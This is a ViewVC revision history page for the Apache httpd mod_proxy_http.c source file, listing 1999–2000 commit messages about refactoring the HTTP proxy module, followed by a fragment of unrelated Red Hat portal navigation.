Diff to [previous 87013](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=87013&r2=87025)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=87013&r2=87025&diff_format=h))
```
Call apr_create_socket() instead of apr_create_tcp_socket() (deprecated).

```

---

Revision [**87013**](/viewvc?view=revision&revision=87013) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=87013&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=87013&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=87013))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=87013)

Modified
*Sat Nov 18 17:13:29 2000 UTC*
(24 years, 2 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=87013)

File length: 17590 byte(s)

Diff to [previous 87001](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=87001&r2=87013)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=87001&r2=87013&diff_format=h))
```
Begin to remove some of the cache-ing logic from the http proxy.

```

---

Revision [**87001**](/viewvc?view=revision&revision=87001) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=87001&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=87001&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=87001))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=87001)

Modified
*Sat Nov 18 03:17:21 2000 UTC*
(24 years, 2 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=87001)

File length: 18695 byte(s)

Diff to [previous 86988](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86988&r2=87001)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86988&r2=87001&diff_format=h))
```
More proxy fixes.  There are still some bugs in this code, but this has
successfully proxied www.yahoo.com and www.ntrnet.net among other test
sites that I chose at random.

```

---

Revision [**86988**](/viewvc?view=revision&revision=86988) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86988&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86988&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=86988))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=86988)

Modified
*Fri Nov 17 00:19:30 2000 UTC*
(24 years, 2 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=86988)

File length: 18434 byte(s)

Diff to [previous 86978](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86978&r2=86988)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86978&r2=86988&diff_format=h))
```
This removes all BUFF's from the HTTP proxy.  This code is relatively
ugly, but it does proxy pages.  This even fixes the content-type bug
that I introduced yesterday sometime.  As soon as BUFF is removed from
the FTP proxy, the buff.c and buff.h files need to go away.

```

---

Revision [**86978**](/viewvc?view=revision&revision=86978) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86978&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86978&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=86978))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=86978)

Modified
*Thu Nov 16 01:57:46 2000 UTC*
(24 years, 2 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=86978)

File length: 17481 byte(s)

Diff to [previous 86963](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86963&r2=86978)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86963&r2=86978&diff_format=h))
```
Make the proxy work with filters.  We are still using BUFF for the
back-end communication, but BUFF has been removed from the communication
with the client.  The headers are not working correctly yet, but we are
making progress.  The most important part of this commit is that we are
able to actually filter data coming from the proxy.

```

---

Revision [**86963**](/viewvc?view=revision&revision=86963) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86963&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86963&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=86963))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=86963)

Modified
*Tue Nov 14 19:32:03 2000 UTC*
(24 years, 2 months ago)
by *chuck*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=86963)

File length: 16889 byte(s)

Diff to [previous 86928](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86928&r2=86963)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86928&r2=86963&diff_format=h))
```
Changes for previous ap_proxy_doconnect() calling
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**86928**](/viewvc?view=revision&revision=86928) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86928&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86928&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=86928))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=86928)

Modified
*Sat Nov 11 18:34:10 2000 UTC*
(24 years, 2 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=86928)

File length: 16859 byte(s)

Diff to [previous 86927](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86927&r2=86928)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86927&r2=86928&diff_format=h))
```
The whole proxy compiles cleanly now.  Now we need to make it actually work
again, but at least we are making progress.

```

---

Revision [**86927**](/viewvc?view=revision&revision=86927) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86927&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86927&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=86927))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=86927)

Modified
*Sat Nov 11 18:13:04 2000 UTC*
(24 years, 2 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=86927)

File length: 16856 byte(s)

Diff to [previous 86923](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86923&r2=86927)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86923&r2=86927&diff_format=h))
```
proxy_ftp and proxy_http both compile now.  Not tested because the rest of
the proxy is still not compiling, but we are making progress.

```

---

Revision [**86923**](/viewvc?view=revision&revision=86923) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86923&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86923&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=86923))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=86923)

Modified
*Sat Nov 11 11:07:03 2000 UTC*
(24 years, 2 months ago)
by *chuck*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=86923)

File length: 16742 byte(s)

Diff to [previous 86440](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86440&r2=86923)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86440&r2=86923&diff_format=h))
```
This is the 1.3.x current proxy into 2.0 - first stage
PR:
Obtained from: Sam Magnuson
Submitted by:  Chuck Murcko
Reviewed by:

```

---

Revision [**86440**](/viewvc?view=revision&revision=86440) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86440&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86440&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=86440))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=86440)

Modified
*Sun Oct 8 03:23:05 2000 UTC*
(24 years, 3 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=86440)

File length: 18141 byte(s)

Diff to [previous 86136](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86136&r2=86440)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86136&r2=86440&diff_format=h))
```
Remove all compiler warnings from the proxy code.  There are no garauntees
that this still works, but most of the changes were just const-safeness
changes.
PR:	6631

```

---

Revision [**86136**](/viewvc?view=revision&revision=86136) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86136&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86136&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=86136))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=86136)

Modified
*Wed Aug 23 00:01:58 2000 UTC*
(24 years, 5 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=86136)

File length: 18036 byte(s)

Diff to [previous 86008](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86008&r2=86136)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=86008&r2=86136&diff_format=h))
```
Remove IOLs from Apache.  They are no longer necessary, now that we have
filtering beginning to work.  There is a hack that has been repeated
through this patch, we morph a pipe into a socket, and put the socket
into the BUFF.  Everytime we do that, we are working with a pipe from
a CGI, and we should be creating a pipe bucket and passing that bucket
back.  Because we don't actually have pipe buckets yet, we are using this
hack.  When we get pipe buckets, this will be fixed.

```

---

Revision [**86008**](/viewvc?view=revision&revision=86008) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86008&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=86008&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=86008))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=86008)

Modified
*Sun Aug 6 06:07:53 2000 UTC*
(24 years, 5 months ago)
by *wrowe*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=86008)

File length: 18075 byte(s)

Diff to [previous 85976](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85976&r2=86008)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85976&r2=86008&diff_format=h))
```

  Remaining cleanup of ap_ -> apr_ and AP_ -> APR_ transformation...
  see src/lib/apr/apr_compat.h for most details.
  Also a few minor nits to get Win32 to build.

PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**85976**](/viewvc?view=revision&revision=85976) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85976&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85976&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=85976))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=85976)

Modified
*Wed Aug 2 05:27:38 2000 UTC*
(24 years, 5 months ago)
by *dougm*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=85976)

File length: 18070 byte(s)

Diff to [previous 85934](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85934&r2=85976)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85934&r2=85976&diff_format=h))
```
prefix libapr functions and types with apr_

```

---

Revision [**85934**](/viewvc?view=revision&revision=85934) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85934&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85934&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=85934))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=85934)

Modified
*Sat Jul 29 16:24:15 2000 UTC*
(24 years, 6 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=85934)

File length: 18038 byte(s)

Diff to [previous 85732](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85732&r2=85934)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85732&r2=85934&diff_format=h))
```
Remove iol_socket.h.  This file had one declaration, and it makes more
sense for that declaraion to move to ap_iol.h.  This also modifies all of
the files that include iol_socket.h to include ap_iol.h

```

---

Revision [**85732**](/viewvc?view=revision&revision=85732) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85732&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85732&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=85732))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=85732)

Modified
*Fri Jun 30 18:08:13 2000 UTC*
(24 years, 7 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=85732)

File length: 18042 byte(s)

Diff to [previous 85563](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85563&r2=85732)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85563&r2=85732&diff_format=h))
```
Combine some common code.  Before this, all platforms implemented their
own iol_sockets using APR.  This just combines all of that code to a
common file and moves that file to main.  I have tested this with all of
the Unix MPM's, but I am willing to bet I missed something (Makefiles) for
Windows, and possibly moving some code for OS/2 and BeOS.

```

---

Revision [**85563**](/viewvc?view=revision&revision=85563) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85563&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85563&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=85563))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=85563)

Modified
*Tue Jun 13 06:17:47 2000 UTC*
(24 years, 7 months ago)
by *chuck*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=85563)

File length: 18040 byte(s)

Diff to [previous 85562](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85562&r2=85563)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85562&r2=85563&diff_format=h))
```
fixups for remaining current warnings

Submitted by:	Chuck Murcko

```

---

Revision [**85562**](/viewvc?view=revision&revision=85562) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85562&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85562&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=85562))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=85562)

Modified
*Tue Jun 13 01:22:09 2000 UTC*
(24 years, 7 months ago)
by *chuck*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=85562)

File length: 18029 byte(s)

Diff to [previous 85552](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85552&r2=85562)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85552&r2=85562&diff_format=h))
```
OK, this builds and is autoconf safe about system headers, until it starts
using APR
PR:
Obtained from:
Submitted by:	Chuck Murcko
Reviewed by:

```

---

Revision [**85552**](/viewvc?view=revision&revision=85552) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85552&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85552&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=85552))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=85552)

Modified
*Mon Jun 12 21:41:58 2000 UTC*
(24 years, 7 months ago)
by *chuck*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=85552)

File length: 18038 byte(s)

Diff to [previous 85486](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85486&r2=85552)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=85486&r2=85552&diff_format=h))
```
New mod_proxy/mod_cache (file cache) for 2.0. This uses a caching API so
that shared mem, LDAP servers, DBs, etc. can also be used for proxy
caching. The caching API is very young, and subject to change as APR changes.

proxy_cache.c from the proxy subdir is no longer used.

Build with --enable-modules=proxy,cache

Lightly tested on Linux, no warranties expressed or implied yet.

Still to do:

strerror(), waitpid(), stat() cleanups
address issues marked by @@@FIXME
add HTTP/1.1

This should be considered a *reference* proxy implementation for 2.0. What
actually ends up shipping with 2.0 is likely going to be rather different as
the redesign evolves. This may end up being the 2.0 backwards compatibility
workalike.

Modified to work with today's conf/build/layout scheme

PR:
Obtained from:
Submitted by:	Sam Magnuson
Reviewed by:	Chuck Murcko

```

---

Revision [**85486**](/viewvc?view=revision&revision=85486) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85486&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=85486&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=85486))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=85486)

Modified
*Fri Jun 9 18:57:16 2000 UTC*
(24 years, 7 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=85486)

File length: 17345 byte(s)

Diff to [previous 84963](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=84963&r2=85486)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=84963&r2=85486&diff_format=h))
```
Remove all occurances of strerror from Apache.  ap_strerror works just
fine with standard errno values, and it is more portable.  This also allows
me to remove the check for strerror from Apache's configure script.

```

---

Revision [**84963**](/viewvc?view=revision&revision=84963) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=84963&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=84963&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=84963))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=84963)

Modified
*Fri Apr 14 15:59:20 2000 UTC*
(24 years, 9 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=84963)

File length: 17297 byte(s)

Diff to [previous 84879](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=84879&r2=84963)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=84879&r2=84963&diff_format=h))
```
Change ap_context_t to ap_pool_t.  This compiles, runs, and serves pages
on Linux, but probably breaks somewhere.

```

---

Revision [**84879**](/viewvc?view=revision&revision=84879) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=84879&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=84879&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=84879))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=84879)

Modified
*Fri Mar 31 09:05:25 2000 UTC*
(24 years, 10 months ago)
by *fielding*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=84879)

File length: 17303 byte(s)

Diff to [previous 84725](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=84725&r2=84879)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=84725&r2=84879&diff_format=h))
```
Update to Apache Software License version 1.1

```

---

Revision [**84725**](/viewvc?view=revision&revision=84725) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=84725&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=84725&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=84725))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=84725)

Modified
*Fri Mar 10 00:07:37 2000 UTC*
(24 years, 10 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=84725)

File length: 17448 byte(s)

Diff to [previous 83852](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=83852&r2=84725)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=83852&r2=84725&diff_format=h))
```
Fix all the License issues.  Including:
s/Apache Group/Apache Software Foundation/
s/1999/2000/
s/Sascha's license/ASF license

```

---

Revision [**83852**](/viewvc?view=revision&revision=83852) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=83852&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=83852&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=83852))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=83852)

Modified
*Tue Aug 31 05:35:52 1999 UTC*
(25 years, 5 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=83852)

File length: 17322 byte(s)

Diff to [previous 83769](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=83769&r2=83852)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=83769&r2=83852&diff_format=h))
```
Changed pools to contexts.  Tested with prefork and pthread mpm's.  I'll
check this out tomorrow and make sure everything was checked in correctly.

```

---

Revision [**83769**](/viewvc?view=revision&revision=83769) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=83769&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=83769&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=83769))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=83769)

Modified
*Thu Aug 26 14:15:07 1999 UTC*
(25 years, 5 months ago)
by *fielding*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=83769)

File length: 17286 byte(s)

Diff to [previous 83751](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=83751&r2=83769)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=83751&r2=83769&diff_format=h))
```
Changes from pthreads.  Removes timeouts, adds mutex.
This probably breaks the proxy on everything but pthreads.

Submitted by:	Bill Stoddard

```

---

Revision [**83751**](/viewvc?view=revision&revision=83751) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=83751&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=83751&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=83751))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=83751)

Added
*Tue Aug 24 06:55:44 1999 UTC*
(25 years, 5 months ago)
by *fielding*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=83751)

File length: 17553 byte(s)
```

Apache 1.3.9 baseline for the Apache 2.0 repository.

Obtained from: Apache 1.3.9 (minus unused files), tag APACHE_1_3_9
Submitted by: Apache Group

```

---

This form allows you to request diffs between any two revisions of this file.
For each of the two "sides" of the diff,
enter a numeric revision.

|  | Diffs between  and |
| --- | --- |
|  | Type of Diff should be a Colored Diff Long Colored Diff Full Colored Diff Unidiff Context Diff Side by Side |

---

| infrastructure at apache.org | **[ViewVC Help](/vc-static/help_log.html)** |
| --- | --- |
| Powered by [ViewVC 1.1.26](http://viewvc.tigris.org/) |  |



=== Content from access.redhat.com_9d80c789_20250126_093432.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
